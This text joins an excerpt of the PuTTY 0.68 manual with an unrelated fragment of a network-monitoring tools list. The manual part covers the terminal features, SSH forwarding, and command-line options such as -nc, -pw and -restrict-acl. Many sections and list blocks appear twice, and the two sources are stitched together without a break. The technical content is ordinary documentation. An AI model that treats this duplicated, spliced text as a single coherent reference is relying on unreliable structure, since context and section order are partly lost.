 You might want to use this feature if you needed to make an SSH connection to a target host which you can only reach by going through a proxy host, and rather than using port forwarding you prefer to use the local proxy feature (see section 4.15.1 for more about local proxies). In this situation you might select ‘Local’ proxy type, set your local proxy command to be ‘plink %proxyhost -nc %host:%port’, enter the target host name on the Session panel, and enter the directly reachable proxy host name on the Proxy panel.  This feature is only available in SSH protocol version 2 (since the version 1 protocol assumes you will always want to run a shell). It is not available in the file transfer tools PSCP and PSFTP. It is available in PuTTY itself, although it is unlikely to be very useful in any tool other than Plink. Also, -nc uses the same server functionality as port forwarding, so it will not work if your server administrator has disabled port forwarding.  (The option is named -nc after the Unix program nc, short for ‘netcat’. The command ‘plink host1 -nc host2:port’ is very similar in functionality to ‘plink host1 nc host2 port’, which invokes nc on the server and tells it to connect to the specified destination. However, Plink's built-in -nc option does not depend on the nc program being installed on the server.) 3.8.3.15 -C: enable compression The -C option enables compression of the data sent across the network. This option is only meaningful if you are using SSH.  This option is equivalent to the ‘Enable compression’ checkbox in the SSH panel of the PuTTY configuration box (see section 4.18.3). 3.8.3.16 -1 and -2: specify an SSH protocol version The -1 and -2 options force PuTTY to use version 1 or version 2 of the SSH protocol. These options are only meaningful if you are using SSH.  These options are equivalent to selecting the SSH protocol version in the SSH panel of the PuTTY configuration box (see section 4.18.4). 3.8.3.17 -4 and -6: specify an Internet protocol version The -4 and -6 options force PuTTY to use the older Internet protocol IPv4 or the newer IPv6 for most outgoing connections.  These options are equivalent to selecting your preferred Internet protocol version as ‘IPv4’ or ‘IPv6’ in the Connection panel of the PuTTY configuration box (see section 4.13.4). 3.8.3.18 -i: specify an SSH private key The -i option allows you to specify the name of a private key file in *.PPK format which PuTTY will use to authenticate with the server. This option is only meaningful if you are using SSH.  If you are using Pageant, you can also specify a public key file (in RFC 4716 or OpenSSH format) to identify a specific key file to use. (This won't work if you're not running Pageant, of course.)  For general information on public-key authentication, see chapter 8.  This option is equivalent to the ‘Private key file for authentication’ box in the Auth panel of the PuTTY configuration box (see section 4.22.8). 3.8.3.19 -loghost: specify a logical host name This option overrides PuTTY's normal SSH host key caching policy by telling it the name of the host you expect your connection to end up at (in cases where this differs from the location PuTTY thinks it's connecting to). It can be a plain host name, or a host name followed by a colon and a port number. See section 4.13.5 for more detail on this. 3.8.3.20 -hostkey: manually specify an expected host key This option overrides PuTTY's normal SSH host key caching policy by telling it exactly what host key to expect, which can be useful if the normal automatic host key store in the Registry is unavailable. The argument to this option should be either a host key fingerprint, or an SSH-2 public key blob. See section 4.20.2 for more information.  You can specify this option more than once if you want to configure more than one key to be accepted. 3.8.3.21 -pgpfp: display PGP key fingerprints This option causes the PuTTY tools not to run as normal, but instead to display the fingerprints of the PuTTY PGP Master Keys, in order to aid with verifying new versions. See appendix E for more information. 3.8.3.22 -sercfg: specify serial port configuration This option specifies the configuration parameters for the serial port (baud rate, stop bits etc). Its argument is interpreted as a comma-separated list of configuration options, which can be as follows:  Any single digit from 5 to 9 sets the number of data bits. ‘1’, ‘1.5’ or ‘2’ sets the number of stop bits.  Any other numeric string is interpreted as a baud rate.  A single lower-case letter specifies the parity: ‘n’ for none, ‘o’ for odd, ‘e’ for even, ‘m’ for mark and ‘s’ for space.  A single upper-case letter specifies the flow control: ‘N’ for none, ‘X’ for XON/XOFF, ‘R’ for RTS/CTS and ‘D’ for DSR/DTR.  For example, ‘-sercfg 19200,8,n,1,N’ denotes a baud rate of 19200, 8 data bits, no parity, 1 stop bit and no flow control. 3.8.3.23 -sessionlog, -sshlog, -sshrawlog: specify session logging These options cause the PuTTY network tools to write out a log file. Each of them expects a file name as an argument, e.g. ‘-sshlog putty.log’ causes an SSH packet log to be written to a file called ‘putty.log’. The three different options select different logging modes, all available from the GUI too: -sessionlog selects ‘All session output’ logging mode. -sshlog selects ‘SSH packets’ logging mode. -sshrawlog selects ‘SSH packets and raw data’ logging mode.  For more information on logging configuration, see section 4.2. 3.8.3.24 -proxycmd: specify a local proxy command This option enables PuTTY's mode for running a command on the local machine and using it as a proxy for the network connection. It expects a shell command string as an argument.  See section 4.15.1 for more information on this, and on other proxy settings. In particular, note that since the special sequences described there are understood in the argument string, literal backslashes must be doubled (if you want \ in your command, you must put \\ on the command line). 3.8.3.25 -restrict-acl: restrict the Windows process ACL This option (on Windows only) causes PuTTY (or another PuTTY tool) to try to lock down the operating system's access control on its own process. If this succeeds, it should present an extra obstacle to malware that has managed to run under the same user id as the PuTTY process, by preventing it from attaching to PuTTY using the same interfaces debuggers use and either reading sensitive information out of its memory or hijacking its network session.  This option is not enabled by default, because this form of interaction between Windows programs has many legitimate uses, including accessibility software such as screen readers. Also, it cannot provide full security against this class of attack in any case, because PuTTY can only lock down its own ACL after it has started up, and malware could still get in if it attacks the process between startup and lockdown. So it trades away noticeable convenience, and delivers less real security than you might want. However, if you do want to make that tradeoff anyway, the option is available.  A PuTTY process started with -restrict-acl will pass that on to any processes started with Duplicate Session, New Session etc. (However, if you're invoking PuTTY tools explicitly, for instance as a proxy command, you'll need to arrange to pass them the -restrict-acl option yourself, if that's what you want.) If you want to provide feedback on this manual or on the PuTTY tools themselves, see the Feedback page. [PuTTY release 0.68]Previous | Contents | Index | Next This chapter provides a general introduction to some more advanced features of PuTTY. For extreme detail and reference purposes, chapter 4 is likely to contain more information.  A lot of PuTTY's complexity and features are in the configuration panel. Once you have worked your way through that and started a session, things should be reasonably simple after that. Nevertheless, there are a few more useful features available. Often in a PuTTY session you will find text on your terminal screen which you want to type in again. Like most other terminal emulators, PuTTY allows you to copy and paste the text rather than having to type it again. Also, copy and paste uses the Windows clipboard, so that you can paste (for example) URLs into a web browser, or paste from a word processor or spreadsheet into your terminal session.  PuTTY's copy and paste works entirely with the mouse. In order to copy text to the clipboard, you just click the left mouse button in the terminal window, and drag to select text. When you let go of the button, the text is automatically copied to the clipboard. You do not need to press Ctrl-C or Ctrl-Ins; in fact, if you do press Ctrl-C, PuTTY will send a Ctrl-C character down your session to the server where it will probably cause a process to be interrupted.  Pasting is done using the right button (or the middle mouse button, if you have a three-button mouse and have set it up; see section 4.11.2). (Pressing Shift-Ins, or selecting ‘Paste’ from the Ctrl+right-click context menu, have the same effect.) When you click the right mouse button, PuTTY will read whatever is in the Windows clipboard and paste it into your session, exactly as if it had been typed at the keyboard. (Therefore, be careful of pasting formatted text into an editor that does automatic indenting; you may find that the spaces pasted from the clipboard plus the spaces added by the editor add up to too many spaces and ruin the formatting. There is nothing PuTTY can do about this.)  If you double-click the left mouse button, PuTTY will select a whole word. If you double-click, hold down the second click, and drag the mouse, PuTTY will select a sequence of whole words. (You can adjust precisely what PuTTY considers to be part of a word; see section 4.11.5.) If you triple-click, or triple-click and drag, then PuTTY will select a whole line or sequence of lines.  If you want to select a rectangular region instead of selecting to the end of each line, you can do this by holding down Alt when you make your selection. You can also configure rectangular selection to be the default, and then holding down Alt gives the normal behaviour instead: see section 4.11.4 for details.  (In some Unix environments, Alt+drag is intercepted by the window manager. Shift+Alt+drag should work for rectangular selection as well, so you could try that instead.)  If you have a middle mouse button, then you can use it to adjust an existing selection if you selected something slightly wrong. (If you have configured the middle mouse button to paste, then the right mouse button does this instead.) Click the button on the screen, and you can pick up the nearest end of the selection and drag it to somewhere else.  It's possible for the server to ask to handle mouse clicks in the PuTTY window itself. If this happens, the mouse pointer will turn into an arrow, and using the mouse to copy and paste will only work if you hold down Shift. See section 4.6.2 and section 4.11.3 for details of this feature and how to configure it.  PuTTY keeps track of text that has scrolled up off the top of the terminal. So if something appears on the screen that you want to read, but it scrolls too fast and it's gone by the time you try to look for it, you can use the scrollbar on the right side of the window to look back up the session history and find it again.  As well as using the scrollbar, you can also page the scrollback up and down by pressing Shift-PgUp and Shift-PgDn. You can scroll a line at a time using Ctrl-PgUp and Ctrl-PgDn. These are still available if you configure the scrollbar to be invisible.  By default the last 2000 lines scrolled off the top are preserved for you to look at. You can increase (or decrease) this value using the configuration box; see section 4.7.3.  If you click the left mouse button on the icon in the top left corner of PuTTY's terminal window, or click the right mouse button on the title bar, you will see the standard Windows system menu containing items like Minimise, Move, Size and Close.  PuTTY's system menu contains extra program features in addition to the Windows standard options. These extra menu commands are described below.  (These options are also available in a context menu brought up by holding Ctrl and clicking with the right mouse button anywhere in the PuTTY window.)  If you choose ‘Event Log’ from the system menu, a small window will pop up in which PuTTY logs significant events during the connection. Most of the events in the log will probably take place during session startup, but a few can occur at any point in the session, and one or two occur right at the end.  You can use the mouse to select one or more lines of the Event Log, and hit the Copy button to copy them to the clipboard. If you are reporting a bug, it's often useful to paste the contents of the Event Log into your bug report.  (The Event Log is not the same as the facility to create a log file of your session; that's described in section 3.2.)  Depending on the protocol used for the current session, there may be a submenu of ‘special commands’. These are protocol-specific tokens, such as a ‘break’ signal, that can be sent down a connection in addition to normal data. Their precise effect is usually up to the server. Currently only Telnet, SSH, and serial connections have special commands.  The ‘break’ signal can also be invoked from the keyboard with Ctrl-Break.  The following special commands are available in Telnet:  PuTTY can also be configured to send this when the Backspace key is pressed; see section 4.16.3.  Should have no effect.  PuTTY can also be configured to send this when Ctrl-C is typed; see section 4.16.3.  PuTTY can also be configured to send this when Ctrl-Z is typed; see section 4.16.3.  In an SSH connection, the following special commands are available:  Should have no effect.  Only available in SSH-2. Forces a repeat key exchange immediately (and resets associated timers and counters). For more information about repeat key exchanges, see section 4.19.2.  Only available in SSH-2. This submenu appears only if the server has host keys of a type that PuTTY doesn't already have cached, and so won't consider. Selecting a key here will allow PuTTY to use that key now and in future: PuTTY will do a fresh key-exchange with the selected key, and immediately add that key to its permanent cache (relying on the host key used at the start of the connection to cross-certify the new key). That key will be used for the rest of the current session; it may not actually be used for future sessions, depending on your preferences (see section 4.20.1).  Normally, PuTTY will carry on using a host key it already knows, even if the server offers key formats that PuTTY would otherwise prefer, to avoid host key prompts. As a result, if you've been using a server for some years, you may still be using an older key than a new user would use, due to server upgrades in the meantime. The SSH protocol unfortunately does not have organised facilities for host key migration and rollover, but this allows you to manually upgrade.  Only available in SSH-2, and only during a session. Optional extension; may not be supported by server. PuTTY requests the server's default break length.  Only available in SSH-2, and only during a session. Sends various POSIX signals. Not honoured by all servers.  With a serial connection, the only available special command is ‘Break’.  PuTTY's system menu provides some shortcut ways to start new sessions:  If you select ‘Change Settings’ from the system menu, PuTTY will display a cut-down version of its initial configuration box. This allows you to adjust most properties of your current session. You can change the terminal size, the font, the actions of various keypresses, the colours, and so on.  Some of the options that are available in the main configuration box are not shown in the cut-down Change Settings box. These are usually options which don't make sense to change in the middle of a session (for example, you can't switch from SSH to Telnet in mid-session).  You can save the current settings to a saved session for future use from this dialog box. See section 4.1.2 for more on saved sessions.  This system menu option provides a convenient way to copy the whole contents of the terminal screen (up to the last nonempty line) and scrollback to the clipboard in one go.  The ‘Clear Scrollback’ option on the system menu tells PuTTY to discard all the lines of text that have been kept after they scrolled off the top of the screen. This might be useful, for example, if you displayed sensitive information and wanted to make sure nobody could look over your shoulder and see it. (Note that this only prevents a casual user from using the scrollbar to view the information; the text is not guaranteed not to still be in PuTTY's memory.)  The ‘Reset Terminal’ option causes a full reset of the terminal emulation. A VT-series terminal is a complex piece of software and can easily get into a state where all the text printed becomes unreadable. (This can happen, for example, if you accidentally output a binary file to your terminal.) If this happens, selecting Reset Terminal should sort it out.  If you find the title bar on a maximised window to be ugly or distracting, you can select Full Screen mode to maximise PuTTY ‘even more’. When you select this, PuTTY will expand to fill the whole screen and its borders, title bar and scrollbar will disappear. (You can configure the scrollbar not to disappear in full-screen mode if you want to keep it; see section 4.7.3.)  When you are in full-screen mode, you can still access the system menu if you click the left mouse button in the extreme top left corner of the screen.  For some purposes you may find you want to log everything that appears on your screen. You can do this using the ‘Logging’ panel in the configuration box.  To begin a session log, select ‘Change Settings’ from the system menu and go to the Logging panel. Enter a log file name, and select a logging mode. (You can log all session output including the terminal control sequences, or you can just log the printable text. It depends what you want the log for.) Click ‘Apply’ and your log will be started. Later on, you can go back to the Logging panel and select ‘Logging turned off completely’ to stop logging; then PuTTY will close the log file and you can safely read it.  See section 4.2 for more details and options.  If you find that special characters (accented characters, for example, or line-drawing characters) are not being displayed correctly in your PuTTY session, it may be that PuTTY is interpreting the characters sent by the server according to the wrong character set. There are a lot of different character sets available, and no good way for PuTTY to know which to use, so it's entirely possible for this to happen.  If you click ‘Change Settings’ and look at the ‘Translation’ panel, you should see a large number of character sets which you can select, and other related options. Now all you need is to find out which of them you want! (See section 4.10 for more information.)  The SSH protocol has the ability to securely forward X Window System graphical applications over your encrypted SSH connection, so that you can run an application on the SSH server machine and have it put its windows up on your local machine without sending any X network traffic in the clear.  In order to use this feature, you will need an X display server for your Windows machine, such as Cygwin/X, X-Win32, or Exceed. This will probably install itself as display number 0 on your local machine; if it doesn't, the manual for the X server should tell you what it does do.  You should then tick the ‘Enable X11 forwarding’ box in the X11 panel (see section 4.25) before starting your SSH session. The ‘X display location’ box is blank by default, which means that PuTTY will try to use a sensible default such as :0, which is the usual display location where your X server will be installed. If that needs changing, then change it.  Now you should be able to log in to the SSH server as normal. To check that X forwarding has been successfully negotiated during connection startup, you can check the PuTTY Event Log (see section 3.1.3.1). It should say something like this:  If the remote system is Unix or Unix-like, you should also be able to see that the DISPLAY environment variable has been set to point at display 10 or above on the SSH server machine itself:  If this works, you should then be able to run X applications in the remote session and have them display their windows on your PC.  For more options relating to X11 forwarding, see section 4.25.  The SSH protocol has the ability to forward arbitrary network (TCP) connections over your encrypted SSH connection, to avoid the network traffic being sent in clear. For example, you could use this to connect from your home computer to a POP-3 server on a remote machine without your POP-3 password being visible to network sniffers.  In order to use port forwarding to connect from your local machine to a port on a remote server, you need to:  Now start your session and log in. (Port forwarding will not be enabled until after you have logged in; otherwise it would be easy to perform completely anonymous network attacks, and gain access to anyone's virtual private network.) To check that PuTTY has set up the port forwarding correctly, you can look at the PuTTY Event Log (see section 3.1.3.1). It should say something like this:  Now if you connect to the source port number on your local PC, you should find that it answers you exactly as if it were the service running on the destination machine. So in this example, you could then configure an e-mail client to use localhost:3110 as a POP-3 server instead of popserver.example.com:110. (Of course, the forwarding will stop happening when your PuTTY session closes down.)  You can also forward ports in the other direction: arrange for a particular port number on the server machine to be forwarded back to your PC as a connection to a service on your PC or near it. To do this, just select the ‘Remote’ radio button instead of the ‘Local’ one. The ‘Source port’ box will now specify a port number on the server (note that most servers will not allow you to use port numbers under 1024 for this purpose).  An alternative way to forward local connections to remote hosts is to use dynamic SOCKS proxying. In this mode, PuTTY acts as a SOCKS server, which SOCKS-aware programs can connect to and open forwarded connections to the destination of their choice, so this can be an alternative to long lists of static forwardings. To use this mode, you will need to select the ‘Dynamic’ radio button instead of ‘Local’, and then you should not enter anything into the ‘Destination’ box (it will be ignored). PuTTY will then listen for SOCKS connections on the port you have specified. Most web browsers can be configured to connect to this SOCKS proxy service; also, you can forward other PuTTY connections through it by setting up the Proxy control panel (see section 4.15 for details).  The source port for a forwarded connection usually does not accept connections from any machine except the SSH client or server machine itself (for local and remote forwardings respectively). There are controls in the Tunnels panel to change this:  You can also specify an IP address to listen on. Typically a Windows machine can be asked to listen on any single IP address in the 127.*.*.* range, and all of these are loopback addresses available only to the local machine. So if you forward (for example) 127.0.0.5:79 to a remote machine's finger port, then you should be able to run commands such as finger fred@127.0.0.5. This can be useful if the program connecting to the forwarded port doesn't allow you to change the port number it uses. This feature is available for local-to-remote forwarded ports; SSH-1 is unable to support it for remote-to-local ports, while SSH-2 can support it in theory but servers will not necessarily cooperate.  (Note that if you're using Windows XP Service Pack 2, you may need to obtain a fix from Microsoft in order to use addresses like 127.0.0.5 - see question A.7.20.)  For more options relating to port forwarding, see section 4.26.  If the connection you are forwarding over SSH is itself a second SSH connection made by another copy of PuTTY, you might find the ‘logical host name’ configuration option useful to warn PuTTY of which host key it should be expecting. See section 4.13.5 for details of this.  A lot of Internet protocols are composed of commands and responses in plain text. For example, SMTP (the protocol used to transfer e-mail), NNTP (the protocol used to transfer Usenet news), and HTTP (the protocol used to serve Web pages) all consist of commands in readable plain text.  Sometimes it can be useful to connect directly to one of these services and speak the protocol ‘by hand’, by typing protocol commands and watching the responses. On Unix machines, you can do this using the system's telnet command to connect to the right port number. For example, telnet mailserver.example.com 25 might enable you to talk directly to the SMTP service running on a mail server.  Although the Unix telnet program provides this functionality, the protocol being used is not really Telnet. Really there is no actual protocol at all; the bytes sent down the connection are exactly the ones you type, and the bytes shown on the screen are exactly the ones sent by the server. Unix telnet will attempt to detect or guess whether the service it is talking to is a real Telnet service or not; PuTTY prefers to be told for certain.  In order to make a debugging connection to a service of this type, you simply select the fourth protocol name, ‘Raw’, from the ‘Protocol’ buttons in the ‘Session’ configuration panel. (See section 4.1.1.) You can then enter a host name and a port number, and make the connection.  PuTTY can connect directly to a local serial line as an alternative to making a network connection. In this mode, text typed into the PuTTY window will be sent straight out of your computer's serial port, and data received through that port will be displayed in the PuTTY window. You might use this mode, for example, if your serial port is connected to another computer which has a serial connection.  To make a connection of this type, simply select ‘Serial’ from the ‘Connection type’ radio buttons on the ‘Session’ configuration panel (see section 4.1.1). The ‘Host Name’ and ‘Port’ boxes will transform into ‘Serial line’ and ‘Speed’, allowing you to specify which serial line to use (if your computer has more than one) and what speed (baud rate) to use when transferring data. For further configuration options (data bits, stop bits, parity, flow control), you can use the ‘Serial’ configuration panel (see section 4.28).  After you start up PuTTY in serial mode, you might find that you have to make the first move, by sending some data out of the serial line in order to notify the device at the other end that someone is there for it to talk to. This probably depends on the device. If you start up a PuTTY serial session and nothing appears in the window, try pressing Return a few times and see if that helps.  A serial line provides no well defined means for one end of the connection to notify the other that the connection is finished. Therefore, PuTTY in serial mode will remain connected until you close the window using the close button.  PuTTY can be made to do various things without user intervention by supplying command-line arguments (e.g., from a command prompt window, or a Windows shortcut). These options allow you to bypass the configuration window and launch straight into a session.  To start a connection to a server called host:  If this syntax is used, settings are taken from the Default Settings (see section 4.1.2); user overrides these settings if supplied. Also, you can specify a protocol, which will override the default protocol (see section 3.8.3.2).  For telnet sessions, the following alternative syntax is supported (this makes PuTTY suitable for use as a URL handler for telnet URLs in web browsers):  To start a connection to a serial port, e.g. COM1:  In order to start an existing saved session called sessionname, use the -load option (described in section 3.8.3.1).  If invoked with the -cleanup option, rather than running as normal, PuTTY will remove its registry entries and random seed file from the local machine (after confirming with the user). It will also attempt to remove information about recently launched sessions stored in the ‘jump list’ on Windows 7 and up.  Note that on multi-user systems, -cleanup only removes registry entries and files associated with the currently logged-in user.  PuTTY and its associated tools support a range of command-line options, most of which are consistent across all the tools. This section lists the available options in all tools. Options which are specific to a particular tool are covered in the chapter about that tool. The -load option causes PuTTY to load configuration details out of a saved session. If these details include a host name, then this option is all you need to make PuTTY start a session.  You need double quotes around the session name if it contains spaces.  If you want to create a Windows shortcut to start a PuTTY saved session, this is the option you should use: your shortcut should call something like  (Note that PuTTY itself supports an alternative form of this option, for backwards compatibility. If you execute putty @sessionname it will have the same effect as putty -load "sessionname". With the @ form, no double quotes are required, and the @ sign must be the very first thing on the command line. This form of the option is deprecated.)  To choose which protocol you want to connect with, you can use one of these options:  These options are not available in the file transfer tools PSCP and PSFTP (which only work with the SSH protocol).  These options are equivalent to the protocol selection buttons in the Session panel of the PuTTY configuration box (see section 4.1.1). Most of the PuTTY tools can be made to tell you more about what they are doing by supplying the -v option. If you are having trouble when making a connection, or you're simply curious, you can turn this switch on and hope to find out more about what is happening.  You can specify the user name to log in as on the remote server using the -l option. For example, plink login.example.com -l fred.  These options are equivalent to the username selection box in the Connection panel of the PuTTY configuration box (see section 4.14.1).  As well as setting up port forwardings in the PuTTY configuration (see section 4.26), you can also set up forwardings on the command line. The command-line options work just like the ones in Unix ssh programs.  To forward a local port (say 5110) to a remote destination (say popserver.example.com port 110), you can write something like one of these:  To forward a remote port to a local destination, just use the -R option instead of -L:  To specify an IP address for the listening end of the tunnel, prepend it to the argument:  To set up SOCKS-based dynamic port forwarding on a local port, use the -D option. For this one you only have to pass the port number:  For general information on port forwarding, see section 3.5.  These options are not available in the file transfer tools PSCP and PSFTP.  The -m option performs a similar function to the ‘Remote command’ box in the SSH panel of the PuTTY configuration box (see section 4.18.1). However, the -m option expects to be given a local file name, and it will read a command from that file.  With some servers (particularly Unix systems), you can even put multiple lines in this file and execute more than one command in sequence, or a whole shell script; but this is arguably an abuse, and cannot be expected to work on all servers. In particular, it is known not to work with certain ‘embedded’ servers, such as Cisco routers.  This option is not available in the file transfer tools PSCP and PSFTP.  The -P option is used to specify the port number to connect to. If you have a Telnet server running on port 9696 of a machine instead of port 23, for example:  (Note that this option is more useful in Plink than in PuTTY, because in PuTTY you can write putty -telnet host.name 9696 in any case.)  This option is equivalent to the port number control in the Session panel of the PuTTY configuration box (see section 4.1.1).  A simple way to automate a remote login is to supply your password on the command line. This is not recommended for reasons of security. If you possibly can, we recommend you set up public-key authentication instead. See chapter 8 for details.  Note that the -pw option only works when you are using the SSH protocol. Due to fundamental limitations of Telnet and Rlogin, these protocols do not support automated password authentication.  The -agent option turns on SSH authentication using Pageant, and -noagent turns it off. These options are only meaningful if you are using SSH.  See chapter 9 for general information on Pageant.  These options are equivalent to the agent authentication checkbox in the Auth panel of the PuTTY configuration box (see section 4.22.3).  The -A option turns on SSH agent forwarding, and -a turns it off. These options are only meaningful if you are using SSH.  See chapter 9 for general information on Pageant, and section 9.4 for information on agent forwarding. Note that there is a security risk involved with enabling this option; see section 9.5 for details.  These options are equivalent to the agent forwarding checkbox in the Auth panel of the PuTTY configuration box (see section 4.22.6).  These options are not available in the file transfer tools PSCP and PSFTP.  The -X option turns on X11 forwarding in SSH, and -x turns it off. These options are only meaningful if you are using SSH.  For information on X11 forwarding, see section 3.4.  These options are equivalent to the X11 forwarding checkbox in the X11 panel of the PuTTY configuration box (see section 4.25).  These options are not available in the file transfer tools PSCP and PSFTP.  The -t option ensures PuTTY attempts to allocate a pseudo-terminal at the server, and -T stops it from allocating one. These options are only meaningful if you are using SSH.  These options are equivalent to the ‘Don't allocate a pseudo-terminal’ checkbox in the SSH panel of the PuTTY configuration box (see section 4.24.1).  These options are not available in the file transfer tools PSCP and PSFTP.  The -N option prevents PuTTY from attempting to start a shell or command on the remote server. You might want to use this option if you are only using the SSH connection for port forwarding, and your user account on the server does not have the ability to run a shell.  This feature is only available in SSH protocol version 2 (since the version 1 protocol assumes you will always want to run a shell).  This option is equivalent to the ‘Don't start a shell or command at all’ checkbox in the SSH panel of the PuTTY configuration box (see section 4.18.2).  This option is not available in the file transfer tools PSCP and PSFTP.  The -nc option prevents Plink (or PuTTY) from attempting to start a shell or command on the remote server. Instead, it will instruct the remote server to open a network connection to a host name and port number specified by you, and treat that network connection as if it were the main session.  You specify a host and port as an argument to the -nc option, with a colon separating the host name from the port number, like this:  You might want to use this feature if you needed to make an SSH connection to a target host which you can only reach by going through a proxy host, and rather than using port forwarding you prefer to use the local proxy feature (see section 4.15.1 for more about local proxies). In this situation you might select ‘Local’ proxy type, set your local proxy command to be ‘plink %proxyhost -nc %host:%port’, enter the target host name on the Session panel, and enter the directly reachable proxy host name on the Proxy panel.  This feature is only available in SSH protocol version 2 (since the version 1 protocol assumes you will always want to run a shell). It is not available in the file transfer tools PSCP and PSFTP. It is available in PuTTY itself, although it is unlikely to be very useful in any tool other than Plink. Also, -nc uses the same server functionality as port forwarding, so it will not work if your server administrator has disabled port forwarding.  (The option is named -nc after the Unix program nc, short for ‘netcat’. The command ‘plink host1 -nc host2:port’ is very similar in functionality to ‘plink host1 nc host2 port’, which invokes nc on the server and tells it to connect to the specified destination. However, Plink's built-in -nc option does not depend on the nc program being installed on the server.)  The -C option enables compression of the data sent across the network. This option is only meaningful if you are using SSH.  This option is equivalent to the ‘Enable compression’ checkbox in the SSH panel of the PuTTY configuration box (see section 4.18.3).  The -1 and -2 options force PuTTY to use version 1 or version 2 of the SSH protocol. These options are only meaningful if you are using SSH.  These options are equivalent to selecting the SSH protocol version in the SSH panel of the PuTTY configuration box (see section 4.18.4).  The -4 and -6 options force PuTTY to use the older Internet protocol IPv4 or the newer IPv6 for most outgoing connections.  These options are equivalent to selecting your preferred Internet protocol version as ‘IPv4’ or ‘IPv6’ in the Connection panel of the PuTTY configuration box (see section 4.13.4).  The -i option allows you to specify the name of a private key file in *.PPK format which PuTTY will use to authenticate with the server. This option is only meaningful if you are using SSH.  If you are using Pageant, you can also specify a public key file (in RFC 4716 or OpenSSH format) to identify a specific key file to use. (This won't work if you're not running Pageant, of course.)  For general information on public-key authentication, see chapter 8.  This option is equivalent to the ‘Private key file for authentication’ box in the Auth panel of the PuTTY configuration box (see section 4.22.8).  This option overrides PuTTY's normal SSH host key caching policy by telling it the name of the host you expect your connection to end up at (in cases where this differs from the location PuTTY thinks it's connecting to). It can be a plain host name, or a host name followed by a colon and a port number. See section 4.13.5 for more detail on this.  This option overrides PuTTY's normal SSH host key caching policy by telling it exactly what host key to expect, which can be useful if the normal automatic host key store in the Registry is unavailable. The argument to this option should be either a host key fingerprint, or an SSH-2 public key blob. See section 4.20.2 for more information.  You can specify this option more than once if you want to configure more than one key to be accepted.  This option causes the PuTTY tools not to run as normal, but instead to display the fingerprints of the PuTTY PGP Master Keys, in order to aid with verifying new versions. See appendix E for more information.  This option specifies the configuration parameters for the serial port (baud rate, stop bits etc). Its argument is interpreted as a comma-separated list of configuration options, which can be as follows:  For example, ‘-sercfg 19200,8,n,1,N’ denotes a baud rate of 19200, 8 data bits, no parity, 1 stop bit and no flow control.  These options cause the PuTTY network tools to write out a log file. Each of them expects a file name as an argument, e.g. ‘-sshlog putty.log’ causes an SSH packet log to be written to a file called ‘putty.log’. The three different options select different logging modes, all available from the GUI too:  For more information on logging configuration, see section 4.2.  This option enables PuTTY's mode for running a command on the local machine and using it as a proxy for the network connection. It expects a shell command string as an argument.  See section 4.15.1 for more information on this, and on other proxy settings. In particular, note that since the special sequences described there are understood in the argument string, literal backslashes must be doubled (if you want \ in your command, you must put \\ on the command line).  This option (on Windows only) causes PuTTY (or another PuTTY tool) to try to lock down the operating system's access control on its own process. If this succeeds, it should present an extra obstacle to malware that has managed to run under the same user id as the PuTTY process, by preventing it from attaching to PuTTY using the same interfaces debuggers use and either reading sensitive information out of its memory or hijacking its network session.  This option is not enabled by default, because this form of interaction between Windows programs has many legitimate uses, including accessibility software such as screen readers. Also, it cannot provide full security against this class of attack in any case, because PuTTY can only lock down its own ACL after it has started up, and malware could still get in if it attacks the process between startup and lockdown. So it trades away noticeable convenience, and delivers less real security than you might want. However, if you do want to make that tradeoff anyway, the option is available.  A PuTTY process started with -restrict-acl will pass that on to any processes started with Duplicate Session, New Session etc. (However, if you're invoking PuTTY tools explicitly, for instance as a proxy command, you'll need to arrange to pass them the -restrict-acl option yourself, if that's what you want.) If you want to provide feedback on this manual or on the PuTTY tools themselves, see the Feedback page.


      Network Path & Application Daemon



    Speed test for both download and upload speeds
    


Bandwidth from various international sites,

    Speed Test,
Speed Test
    from Absolute Futurity
Bandwidth Test,
    
Speed Test from GetVoIP,
   
Calculate web browser uptime.
   

      VoIP Speed Test,

    VoIP Speed, Bandwidth, and Jitter Test,
    


      Ping from multiple sites to a target,
    
      Ping from/to matrix of sites,
Check my Round Trip Times,
      
    
    World's connection speeds from: 
    
    Akamai, 
    Ookla,
    Speedtest Intelligence1,

MLab Internet measurement tools


Calculate web browser uptime.
   

      VoIP Speed Test,

    VoIP Speed, Bandwidth, and Jitter Test,
    


      Ping from multiple sites to a target,
    
      Ping from/to matrix of sites,
Check my Round Trip Times,
      
    
    World's connection speeds from: 
    
    Akamai, 
    Ookla,
    Speedtest Intelligence1,

MLab Internet measurement tools



      VoIP Speed Test,

    VoIP Speed, Bandwidth, and Jitter Test,
    


      Ping from multiple sites to a target,
    
      Ping from/to matrix of sites,
Check my Round Trip Times,
      
    
    World's connection speeds from: 
    
    Akamai, 
    Ookla,
    Speedtest Intelligence1,

MLab Internet measurement tools




      Ping from multiple sites to a target,
    
      Ping from/to matrix of sites,
Check my Round Trip Times,
      
    
    World's connection speeds from: 
    
    Akamai, 
    Ookla,
    Speedtest Intelligence1,

MLab Internet measurement tools


    World's connection speeds from: 
    
    Akamai, 
    Ookla,
    Speedtest Intelligence1,

MLab Internet measurement tools


Where possible I have provided
hypertext links to further sources of information on the tool. 
These links vary in quality
ranging from a pointer to the vendors home page, to the man pages entry, and to how to
download the code. 
We welcome corrections such as identifying broken links 
(especially if you can provide an alternate/update), 
since over the years companies are absorbed by others, disappear, split up,
change their web site etc.
To find broken links, we use 
CheckLink suggested by
Brad Canham, and even better the

Chrome browser extension for checking links,
suggested by Brian Albert Jensen. 
Another valuable tool for checking links is 

Link Quality at a Glance1
from Hans van der Graaf.

Some links such as BasicState and Lemon 
give a 404 error code or a 405 code in the case of MLab but appear 
to be accessible and so currently are left in.
Others such as MindArray and NetLogger sometimes timeout, but usually work.


This is a volunteer, unfunded effort. This helps assure
its independence. 
Increasingly new additions are from reader suggestions/recommendations.
If you have a suggestion for adding something: 
please send an email to Cottrell at slac.stanford.edu 

making sure that you 
indicate where the tool fits in the hierarchy, provide a URL to get
more information on the tool,
and provide a short 
one sentence description of the tool's purpose with no 
marketing hyperbole.  Also if you notice out of date or incorrect links 
please report.  Thanks.



Network Monitoring Platforms (NMPs) - 

Comparison of NMPs, [Contents]



ActionPacked!3
    LiveAction is a platform that combines detailed network topology, device, 
    and flow visualizations with direct interactive monitoring and configuration 
    of QoS, NetFlow, LAN, Routing, IP SLA, Medianet, and AVC features embedded inside Cisco devices.
    

Aggregate Network Manager
    is an enterprise-grade network/application/performance monitoring platform. 
    It tightly integrates with other smart building management systems, such as 
    physical access control, HVAC, lighting, and time/attendance control.
    
Airwave
    Management PlatformT (AMP) wireless network management software 
